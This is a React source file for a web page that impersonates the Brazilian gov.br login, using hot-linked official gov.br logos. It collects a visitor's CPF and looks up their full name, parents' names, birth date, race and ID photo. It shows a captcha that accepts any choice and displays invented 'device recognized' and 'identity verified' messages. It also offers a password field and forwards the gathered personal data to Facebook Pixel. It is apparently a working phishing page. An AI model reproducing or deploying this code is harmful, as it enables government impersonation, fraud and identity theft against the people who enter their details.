export default function LoginPage() {
  const [cpf, setCpf] = useState('');
  
  useEffect(() => {
    // Scroll to top quando página carrega
    window.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
    
    // Set login start time for form completion tracking
    (window as any).loginStartTime = Date.now();

    // Facebook Pixel - Login page view
    fbPixel.trackLoginPageView();

    // Microsoft Clarity - Track login page access
    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'login_page_access', {
        source_page: 'landing_page',
        authentication_method: 'gov_br',
        funnel_step: 'step_1_authentication',
        user_intent: 'start_application_process'
      });
    }
  }, []);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showCaptcha, setShowCaptcha] = useState(false);
  const [selectedImages, setSelectedImages] = useState<number[]>([]);
  const [captchaCompleted, setCaptchaCompleted] = useState(false);
  const [cpfValidationError, setCpfValidationError] = useState('');
  const [isValidatingCpf, setIsValidatingCpf] = useState(false);
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [userApiData, setUserApiData] = useState<any>(null);
  const [showCpfError, setShowCpfError] = useState(false);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [authStep, setAuthStep] = useState(0);

  const formatCPF = (value: string) => {
    // Remove todos os caracteres não numéricos
    const onlyNumbers = value.replace(/\D/g, '');
    
    // Aplica a máscara XXX.XXX.XXX-XX
    if (onlyNumbers.length <= 11) {
      return onlyNumbers
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    return onlyNumbers.substring(0, 11)
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCPF(e.target.value);
    setCpf(formattedValue);
  };

  const formatFullName = (name: string) => {
    if (!name) return '';
    return name
      .toLowerCase()
      .split(' ')
      .map(word => word.charAt(0).toUpperCase() + word.slice(1))
      .join(' ');
  };

  const captchaImages = [
    { id: 1, url: 'https://i.ibb.co/MDQYJYbK/cachorro-1.jpg', hasDog: true },
    { id: 2, url: 'https://picsum.photos/120/120?random=15', hasDog: true },
    { id: 3, url: 'https://i.ibb.co/zV1vfwQY/gato-1.png', hasDog: true },
    { id: 4, url: 'https://picsum.photos/120/120?random=52', hasDog: true },
    { id: 5, url: 'https://i.ibb.co/zVyF8M1n/elefante-1.jpg', hasDog: true },
    { id: 6, url: 'https://i.ibb.co/HLZzyvsv/coelho-1.webp', hasDog: true },
    { id: 7, url: 'https://picsum.photos/120/120?random=59', hasDog: true },
    { id: 8, url: 'https://picsum.photos/120/120?random=81', hasDog: true },
    { id: 9, url: 'https://picsum.photos/120/120?random=12', hasDog: true }
  ];

  const correctDogImages = captchaImages.filter(img => img.hasDog).map(img => img.id);

  const validateCpf = async (cpfValue: string) => {
    setIsValidatingCpf(true);
    setCpfValidationError('');
    
    try {
      const response = await fetch('/api/consultar-cpf', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cpf: cpfValue }),
      });
      
      const result = await response.json();
      
      if (!result.success) {
        setCpfValidationError(result.error || 'CPF inválido');
        return false;
      }
      
      // Armazena os dados da API para uso posterior
      setUserApiData(result.data);
      
      return true;
    } catch (error) {
      setCpfValidationError('Erro ao validar CPF. Tente novamente.');
      return false;
    } finally {
      setIsValidatingCpf(false);
    }
  };

  const handleContinuar = async () => {
    if (cpf.length >= 14) { // CPF completo com máscara
      // Facebook Pixel - Track login attempt
      fbPixel.trackLoginAttempt();

      // Track CPF validation attempt
      const clarity = (window as any).clarity;
      if (clarity) {
        clarity('event', 'cpf_validation_attempt', {
          cpf_format_valid: true,
          funnel_step: 'step_1_cpf_entry',
          user_progress: 'advancing'
        });
      }

      const isValid = await validateCpf(cpf);
      if (isValid) {
        if (clarity) {
          clarity('event', 'cpf_validation_success', {
            has_user_data: !!(userApiData && userApiData.DADOS),
            data_source: userApiData ? 'api' : 'none',
            funnel_step: 'step_1_cpf_validated'
          });
        }

        // Fazer requisição para /api/foto (fire-and-forget)
        const userIpData = localStorage.getItem('user_ip_data');
        let estado = 'SP'; // valor padrão
        
        if (userIpData) {
          try {
            const ipData = JSON.parse(userIpData);
            estado = ipData.region || 'SP';
          } catch (error) {
            console.error('Erro ao parsear user_ip_data:', error);
          }
        }

        const cpfSomenteNumeros = cpf.replace(/\D/g, '');
        
        fetch('/api/foto', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            estado: estado,
            cpf: cpfSomenteNumeros
          }),
        })
        .then(response => {
          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }
          return response.json();
        })
        .then(fotoResult => {
          if (fotoResult && typeof fotoResult === 'object' && fotoResult.success) {
            localStorage.setItem('foto', JSON.stringify(fotoResult));
          }
        })
        .catch(error => {
          console.error('Erro ao buscar foto:', error);
        });

        setShowCaptcha(true);
      } else {
        if (clarity) {
          clarity('event', 'cpf_validation_failed', {
            error_type: cpfValidationError || 'unknown_error',
            funnel_step: 'step_1_cpf_error'
          });
        }
      }
    }
  };

  const handleImageClick = (imageId: number) => {
    if (selectedImages.includes(imageId)) {
      setSelectedImages(selectedImages.filter(id => id !== imageId));
    } else {
      setSelectedImages([...selectedImages, imageId]);
    }
  };

  const handleVerifyCaptcha = () => {
    setShowCaptcha(false);
    setShowAuthModal(true);
    startAuthSequence();
  };

  const startAuthSequence = () => {
    // Verificar se há foto no localStorage
    const fotoData = localStorage.getItem('foto');
    let hasFoto = false;
    
    if (fotoData) {
      try {
        const foto = JSON.parse(fotoData);
        hasFoto = Boolean(foto?.success && foto?.foto_base64);
      } catch (error) {
        console.error('Erro ao parsear foto:', error);
      }
    }

    // Criar steps baseado na disponibilidade da foto (otimizado para velocidade)
    const authSteps = [
      { step: 0, message: 'Acessando...', duration: 800 },
      { step: 1, message: 'Autenticando...', duration: 1000 },
      ...(hasFoto ? [{ step: 2, message: 'Verificando identidade...', duration: 800 }] : []),
      { step: hasFoto ? 3 : 2, message: 'Aparelho Autenticado', duration: 700 },
      { step: hasFoto ? 4 : 3, message: 'Login já realizado neste aparelho', duration: 700 }
    ];

    let currentStep = 0;
    
    const processStep = () => {
      if (currentStep < authSteps.length) {
        setAuthStep(currentStep);
        setTimeout(() => {
          currentStep++;
          processStep();
        }, authSteps[currentStep].duration);
      } else {
        fetchUserDataAndRedirect();
      }
    };

    processStep();
  };

  const fetchUserDataAndRedirect = async () => {
    try {
      // Usar dados já obtidos na validação inicial (evita chamada duplicada)
      if (userApiData && userApiData.DADOS) {
        const userData = {
          cpf: cpf,
          nomeCompleto: userApiData.DADOS.nome ? formatFullName(userApiData.DADOS.nome) : '',
          dataAniversario: userApiData.DADOS.nascimento || userApiData.DADOS.data_nascimento || '',
          nomeMae: userApiData.DADOS.mae ? formatFullName(userApiData.DADOS.mae) : '',
          sexo: userApiData.DADOS.sexo || '',
          ...(userApiData.DADOS.municipio_nascimento && { municipioNascimento: userApiData.DADOS.municipio_nascimento }),
          ...(userApiData.DADOS.raca && { raca: userApiData.DADOS.raca }),
          ...(userApiData.DADOS.pai && { nomePai: formatFullName(userApiData.DADOS.pai) }),
          ...(userApiData.DADOS.nome_social && { nomeSocial: formatFullName(userApiData.DADOS.nome_social) })
        };
        
        localStorage.setItem('userData', JSON.stringify(userData));
        
        // Facebook Pixel - Login success with user data
        fbPixel.trackLoginSuccess(userData);
        
        // Microsoft Clarity - Custom Event
        const clarity = (window as any).clarity;
        if (clarity) {
          clarity('event', 'login_completed', {
            authentication_method: 'cpf_auto',
            user_status: 'authenticated',
            form_completion_time: Date.now() - (window as any).loginStartTime || 0,
            has_user_data: true
          });
        }
      }
    } catch (error) {
      console.error('Error saving user data:', error);
    }
    
    window.location.href = '/localizacao';
  };

  const handlePasswordSubmit = () => {
    setIsProcessing(true);
    
    // Salva os dados do usuário no localStorage antes de redirecionar
    if (userApiData && userApiData.DADOS) {
      const userData = {
        cpf: cpf,
        nomeCompleto: userApiData.DADOS.nome ? formatFullName(userApiData.DADOS.nome) : '',
        dataAniversario: userApiData.DADOS.nascimento || userApiData.DADOS.data_nascimento || '',
        nomeMae: userApiData.DADOS.mae ? formatFullName(userApiData.DADOS.mae) : '',
        sexo: userApiData.DADOS.sexo || '',
        ...(userApiData.DADOS.municipio_nascimento && { municipioNascimento: userApiData.DADOS.municipio_nascimento }),
        ...(userApiData.DADOS.raca && { raca: userApiData.DADOS.raca }),
        ...(userApiData.DADOS.pai && { nomePai: formatFullName(userApiData.DADOS.pai) }),
        ...(userApiData.DADOS.nome_social && { nomeSocial: formatFullName(userApiData.DADOS.nome_social) })
      };
      
      localStorage.setItem('userData', JSON.stringify(userData));
      
      // Facebook Pixel - Login success with user data
      fbPixel.trackLoginSuccess(userData);
    } else {
      // Facebook Pixel - Login success without user data
      fbPixel.trackLoginSuccess({});
    }

    // Microsoft Clarity - Custom Event
    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'login_completed', {
        authentication_method: 'cpf_password',
        user_status: 'authenticated',
        form_completion_time: Date.now() - (window as any).loginStartTime || 0,
        has_user_data: !!(userApiData && userApiData.DADOS)
      });
    }
    
    setTimeout(() => {
      window.location.href = '/localizacao';
    }, 1444);
  };

  const handleCancel = () => {
    setShowPasswordStep(false);
    setPassword('');
  };

  const handleAuthOptionClick = () => {
    setShowCpfError(true);
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: '1.5' }}>
      <header 
        style={{
          background: '#FFFFFF 0 0 no-repeat padding-box',
          display: 'flex',
          flexDirection: 'row',
          justifyContent: 'space-between',
          alignItems: 'center',
          boxShadow: '0 3px 6px #00000029',
          marginBottom: '6px',
          width: '100%',
          padding: '0 10px 0 10px',
        }}
        >
        <a style={{
          color: '#333333',
          fontSize: '0.9em',
          fontWeight: 500,
          textDecoration: 'none'
        }}>
          <img style={{
          width: '100px',
          margin: '10px'
          }} src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"/>
        </a>

        <div className='flex gap-4'>
          <i className='fas fa-moon text-base text-gov-blue'></i>
          <i className='fas fa-cookie-bite text-base text-gov-blue'></i>
        </div>
      </header>
      {/* Main content */}
      <div className="container mx-auto p-8" style={{
      margin: '20px auto auto auto',
      marginTop: 0
      }}>
        <div className="flex justify-center">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-md p-[10px]">
              
              {!showPasswordStep ? (
                <>
                  <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>
                    Identifique-se no gov.br com:
                  </h2>
                  
                  <div className="flex items-center mb-2">
                    <img className='mr-2' src='https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png'/>
                    <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
                      Número do CPF
                    </span>
                  </div>
                  
                  <p className="text-gray-600 text-sm mb-4" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
                    Digite seu CPF para <span className="font-semibold">criar</span> ou <span className="font-semibold">acessar</span> sua conta gov.br
                  </p>
                  
                  <div >
                    {showCpfError && (
                      <div className="mb-3 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
                        Digite o CPF e clique em continuar para validar e iniciar a inscrição
                      </div>
                    )}
                    <label htmlFor="cpf" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
                      CPF
                    </label>
                    <input 
                      type="text" 
                      id="cpf" 
                      value={cpf}
                      onChange={handleCpfChange}
                      inputMode='numeric'
                      placeholder="Digite seu CPF" 
                      className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 text-[#333333] leading-tight "
                      style={{ 
                            fontFamily: 'Rawline, sans-serif', 
                            padding: '0 20px 0 20px',
                            width: '100%',
                            height: '36px !important',
                            background: '#FFFFFF 0 0 no-repeat padding-box',
                            border: '1px solid #888888',
                            borderRadius: '4px',
                            fontSize: '0.8em !important',
                        color: '#333333',
                    }}
                      maxLength={14}
                    />
                    
                    {cpfValidationError && (
                      <div className="mt-2 text-red-600 text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
                        {cpfValidationError}
                      </div>
                    )}
                  </div>
                  
                  <Button
                    onClick={handleContinuar}
                    disabled={cpf.length < 14 || isValidatingCpf}
                    className={`w-full py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline font-bold bg-[#1351B4] cta-button-primary`}
                    style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px', opacity: 1,margin: '30px 0 25px 0' }}
                  >
                    {isValidatingCpf ? (
                      <div className="flex items-center justify-center">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                      </div>
                    ) : (
                      'Continuar'
                    )}
                  </Button>
                  
                  <p className="text-[#333333] text-sm font-semibold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
                    Outras opções de identificação:
                  </p>
                  <hr className='text-[#333333]'/>
                  <div className="space-y-2">
                    <div onClick={handleAuthOptionClick} className="login-option flex items-center cursor-pointer rounded transition-colors duration-300" data-option="internet-banking" style={{
                  marginTop: '20px'
                    }}>
                        <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" 
                             alt="Internet Banking" className="mr-2"/>
                        <div className="flex items-center">
                            <span className="text-green-700 text-xs">Login com seu banco</span>
                            <span className="ml-2 bg-green-700 text-white text-xs px-1 py-0.5 uppercase font-bold" style={{fontSize: '8px'}}>
                                SUA CONTA SERÁ PRATA
                            </span>
                        </div>
                    </div>
                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
                      <img className='mr-2' src='https://sso.acesso.gov.br/assets/govbr/img/icons/app-identidade-govbr.png' />
                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
                        Seu aplicativo gov.br
                      </span>
                    </div>
                    
                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
                      <img className='mr-2' src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" />
                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
                        Seu certificado digital
                      </span>
                    </div>
                    
                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
                      <img className='mr-2' src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" />
                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
                        Seu certificado digital em nuvem
                      </span>
                    </div>
                  </div>
                </>
              ) : (
                <>
                  <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>
                    Digite sua senha
                  </h2>
                  
                  <div className="flex items-center mb-2">

                    <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
                      CPF: 
                      <br/>
                      <strong>{cpf}</strong>
                    </span>
                  </div>
                  
                  <div>
                    <label htmlFor="password" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
                      Senha
                    </label>
                    <div className="relative">
                      <input 
                        type={showPassword ? "text" : "password"} 
                        id="password" 
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Digite sua senha atual" 
                        className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 text-[#333333] leading-tight"
                        style={{ 
                              fontFamily: 'Rawline, sans-serif', 
                              padding: '0 40px 0 20px',
                              width: '100%',
                              height: '36px !important',
                              background: '#FFFFFF 0 0 no-repeat padding-box',
                              border: '1px solid #888888',
                              borderRadius: '4px',
                              fontSize: '0.8em !important',
                          color: '#333333'
                      }}
                      />
                      <button
                        type="button"
                        className="absolute inset-y-0 right-0 pr-3 flex items-center"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'} text-gray-400 hover:text-gray-600`}></i>
                      </button>
                    </div>
                  </div>
                  
                  <div className="flex space-x-3" style={{ margin: '30px 0 25px 0' }}>
         
                    <Button
                      onClick={handleCancel}
                      disabled={isProcessing}
                      className="flex-1 bg-gray-500 text-white font-bold py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline hover:bg-gray-600 transition-colors"
                      style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px' }}
                    >
                      Cancelar
                    </Button>

                    <Button
                      onClick={handlePasswordSubmit}
                      disabled={!password || isProcessing}
                      className="flex-1 bg-[#1351B4] text-white font-bold py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline cta-button-primary animate-gradient transform hover:scale-105 transition-all duration-300"
                      style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px' }}
                    >
                      {isProcessing ? (
                        <div className="flex items-center justify-center">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                          Entrando...
                        </div>
                      ) : (
                        'Entrar'
                      )}
                    </Button>

                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Modal Captcha */}
      {showCaptcha && (
        <div className="fixed inset-0 bg-white bg-opacity-80 flex items-center justify-center z-50" style={{ fontFamily: 'Rawline, sans-serif' }}>
          <div className="bg-white rounded-lg shadow-xl max-w-sm w-full mx-4 overflow-hidden">
            {/* Header com fundo colorido */}
            <div className="bg-teal-600 text-white p-4">
              <div className="flex justify-between items-start">
                <div className="flex items-start space-x-3 flex-shrink-0 flex-1">
                  <div>
                    <h3 className="text-[1.15em] font-medium leading-tight">
                      Encontre todas as criaturas que andam <strong>sobre quatro patas</strong><br />
                    </h3>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Grid de imagens */}
            <div className="p-4">
              <div className="grid grid-cols-3 gap-1 mb-4">
                {captchaImages.map((image) => (
                  <div
                    key={image.id}
                    className={`relative cursor-pointer border-2 rounded overflow-hidden transition-all ${
                      selectedImages.includes(image.id)
                        ? 'border-teal-500 shadow-md'
                        : 'border-gray-200 hover:border-gray-300'
                    }`}
                    onClick={() => handleImageClick(image.id)}
                  >
                    <img
                      src={image.url}
                      alt={`Captcha ${image.id}`}
                      className="w-full h-28 object-cover"
                    />
                    {selectedImages.includes(image.id) && (
                      <div className="absolute inset-0 bg-teal-500 bg-opacity-40 flex items-center justify-center">
                        <div className="w-4 h-4 bg-teal-500 rounded-full flex items-center justify-center">
                          <i className="fas fa-check text-white text-xs"></i>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
              
              {/* Botões inferiores */}
              <div className="flex items-center justify-between">
                <div className="flex space-x-2">
                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
                    <i className="fas fa-ellipsis-h text-gray-600 text-sm"></i>
                  </button>
                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
                    <i className="fas fa-redo text-gray-600 text-sm"></i>
                  </button>
                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
                    <i className="fas fa-volume-up text-gray-600 text-sm"></i>
                  </button>
                </div>
                <SvgIcon />
                <Button
                  onClick={handleVerifyCaptcha}
                  disabled={isProcessing}
                  style={{
                    background: '#1351B4 0 0 no-repeat padding-box'
                  }}
                  className="bg-gray-600 hover:bg-gray-700 text-white px-6 py-2 rounded text-sm font-medium"
                >
                  {isProcessing ? (
                    <div className="flex items-center">
                      <div className="w-3 h-3 border border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                      Verificando...
                    </div>
                  ) : (
                    'Avançar'
                  )}
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Authentication Modal - Minimalista Governamental */}
      {showAuthModal && (() => {
        // Obter foto do localStorage para renderização
        const fotoData = localStorage.getItem('foto');
        let fotoBase64 = null;
        let hasFoto = false;
        
        if (fotoData) {
          try {
            const foto = JSON.parse(fotoData);
            if (foto?.success && foto?.foto_base64) {
              fotoBase64 = foto.foto_base64;
              hasFoto = true;
            }
          } catch (error) {
            console.error('Erro ao parsear foto:', error);
          }
        }

        return (
          <div className="fixed inset-0 bg-gray-500 bg-opacity-50 flex items-center justify-center z-50" style={{ fontFamily: 'Rawline, sans-serif' }}>
            <div className="bg-white border border-gray-300 max-w-sm w-full mx-4 p-6 text-center">
              
              {/* Logo Gov.br */}
              <div className="mb-6">
                <img 
                  src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" 
                  alt="Gov.br" 
                  className="mx-auto"
                  style={{ width: '60px' }}
                />
              </div>
              
              {/* Status */}
              <div className="mb-4">
                {authStep === 0 && (
                  <div className="w-6 h-6 border-2 border-gray-400 border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                )}
                {(authStep === 1 || authStep === 2 || authStep === 3 || authStep === 4) && (
                  <div className="w-6 h-6 bg-green-600 rounded-full mx-auto mb-3 flex items-center justify-center">
                    <div className="w-3 h-3 bg-white rounded-full"></div>
                  </div>
                )}
                
                {/* Foto do usuário - exibida na etapa 2 se disponível */}
                {authStep === 2 && hasFoto && fotoBase64 && (
                  <div className="mb-4">
                    <img 
                      src={`data:image/jpeg;base64,${fotoBase64}`}
                      alt="Foto do usuário" 
                      className="w-24 h-24 rounded-full mx-auto object-cover border-2 border-green-600"
                    />
                  </div>
                )}
                
                <h3 className="text-base font-medium mb-2 text-gray-800">
                  {authStep === 0 && 'Acessando Sistema'}
                  {authStep === 1 && 'Dispositivo Reconhecido'}
                  {authStep === 2 && (hasFoto ? 'Identidade Verificada' : 'Login Automático Realizado')}
                  {authStep === 3 && (hasFoto ? 'Login Automático Realizado' : 'Acesso Confirmado')}
                  {authStep === 4 && 'Acesso Confirmado'}
                </h3>
                
                <p className="text-sm text-gray-600">
                  {authStep === 0 && 'Estabelecendo conexão segura...'}
                  {authStep === 1 && 'Este dispositivo já foi usado anteriormente. Fazendo login automaticamente...'}
                  {authStep === 2 && (hasFoto ? 'Documento verificado com sucesso!' : 'Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema.')}
                  {authStep === 3 && (hasFoto ? 'Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema.' : 'Redirecionando para sua área')}
                  {authStep === 4 && 'Redirecionando para sua área'}
                </p>
              </div>
              
              {/* Barra de progresso simples */}
              <div className="w-full bg-gray-200 h-1 mb-4">
                <div 
                  className={`h-1 bg-gray-600 transition-all duration-1000 ${
                    authStep === 0 ? 'w-1/4' :
                    authStep === 1 ? 'w-2/4' :
                    authStep === 2 ? (hasFoto ? 'w-3/5' : 'w-3/4') :
                    authStep === 3 ? (hasFoto ? 'w-4/5' : 'w-full') :
                    'w-full'
                  }`}
                ></div>
              </div>
              
            </div>
          </div>
        );
      })()}

    </div>
  );
}
